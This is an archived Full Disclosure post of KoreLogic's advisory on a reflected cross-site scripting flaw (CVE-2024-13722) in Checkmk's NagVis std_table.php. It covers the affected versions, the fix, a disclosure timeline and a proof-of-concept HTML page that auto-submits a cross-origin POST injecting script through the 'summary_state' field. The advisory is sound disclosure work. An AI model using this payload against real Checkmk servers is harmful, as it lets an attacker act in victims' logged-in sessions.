---
title: KL-001-2025-001: Checkmk NagVis Reflected Cross-site Scripting
url: https://seclists.org/fulldisclosure/2025/Feb/3
source: Full Disclosure
date: 2025-02-05
fetch_date: 2025-10-06T20:38:01.329457
---

# KL-001-2025-001: Checkmk NagVis Reflected Cross-site Scripting

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-001: Checkmk NagVis Reflected Cross-site Scripting

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 4 Feb 2025 16:08:25 -0600

---

```
KL-001-2025-001: Checkmk NagVis Reflected Cross-site Scripting

Title: Checkmk NagVis Reflected Cross-site Scripting
Advisory ID: KL-001-2025-001
Publication Date: 2025-02-04
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-001.txt

1. Vulnerability Details

     Affected Vendor: Checkmk
     Affected Product: Checkmk/NagVis
     Affected Version: Checkmk 2.3.0p2, NagVis 1.9.40
     Platform: GNU/Linux
     CWE Classification: CWE-79: Improper Neutralization of Input
                         During Web Page Generation
                         ('Cross-site Scripting')
     CVE ID: CVE-2024-13722

2. Vulnerability Description

     The "NagVis" component within Checkmk is vulnerable to reflected
     cross-site scripting. An attacker can craft a malicious link
     that will execute arbitrary JavaScript in the context of the
     browser once clicked. The attack can be performed on both
     authenticated and unauthenticated users.

3. Technical Description

     Checkmk version 2.3.0.p2 ships with a component named
     "NagVis", which is an addon for the network management
     system "Nagios". When receiving an HTTP POST request for the
     "userfiles/gadgets/std_table.php" file, the query and body
     parameters contained within the request are processed by the
     script. Specifically, the script accepts the "members" body
     parameter, which is then parsed as a JSON object.

     The "summary_state" property of the "members" JSON object is
     reflected into the page response without validation. A POST
     request containing a malicious "summary_state" value can inject
     arbitrary JavaScript via the HTML "script" tag into the page
     response. When rendered in a browser, the attacker controlled
     JavaScript executes, enabling an attacker to perform actions
     as the currently logged-in user.

     The "members" JSON object must be supplied via a POST
     body parameter, so exploitation of this issue relies
     on a cross-origin HTTP request originating from an
     attacker controlled web page. The malicious website
     (e.g. https://attacker.com/foo.html) can contain an HTML
     "form" tag with an "action" attribute pointing at the URL
     for the "std_table.php" script.  Additional JavaScript on the
     attacker controlled page can automatically submit the form once
     a user loads the page. The browser will send a POST request
     cross-origin and redirect the browser to the HTTP response of
     the POST request, thereby executing the malicious JavaScript
     on the NagVis web page.

4. Mitigation and Remediation Recommendation

     This issue has been remediated in Nagvis 1.9.42 and Checkmk
     2.3.0p10, both release 2024-07-15.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-06-11 : KoreLogic reports vulnerability details to Checkmk
                  Security Team.
     2024-06-12 : Checkmk acknowledges receipt.
     2024-06-21 : Checkmk requests an extension of embargo to
                  90 business days.
     2024-07-15 : Checkmk/NagVis release versions featuring
                  remediation for the reported vulnerability.
                  Checkmk neglects to inform KoreLogic of this event.
     2024-11-22 : KoreLogic requests an update from Checkmk but
                  receives no reply.
     2025-02-04 : KoreLogic public disclosure.

7. Proof of Concept

     1) Serve the following HTML from a web server (e.g. python -m http.server)
     2) View the URL serving the file in a web browser:
         <html>
```

              <form method='POST'
action='[http://checkmkhost/cmk/nagvis/userfiles/gadgets/std\_table.php?object\_id=1337&scale=100&opts=show\_service\_states=foo;group\_states=0;&type=dyngroup&object\_types=host&state=FL'](http://checkmkhost/cmk/nagvis/userfiles/gadgets/std_table.php?object_id=1337&scale=100&opts=show_service_states=foo;group_states=0;&type=dyngroup&object_types=host&state=FL&apos);>
                   <input type='hidden' name='members'
value='[{"summary\_in\_downtime":1,"summary\_state":"\"><script>eval(window.name)</script>"}]'>

```
              </form>

              <script>
                   window.onload = function() {
                        window.name = `prompt('KoreLogic')`;
                        document.forms[0].submit();
                   }
              </script>
         </html>

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-3/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](2)
[By Date](date.html#3)
[![Next](/images/right-icon-16x16.png)](4)

[![Previous](/images/left-icon-16x16.png)](2)
[By Thread](index.html#3)
[![Next](/images/right-icon-16x16.png)](4)

### Current thread:

* **KL-001-2025-001: Checkmk NagVis Reflected Cross-site Scripting** *KoreLogic Disclosures via Fulldisclosure (Feb 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sec...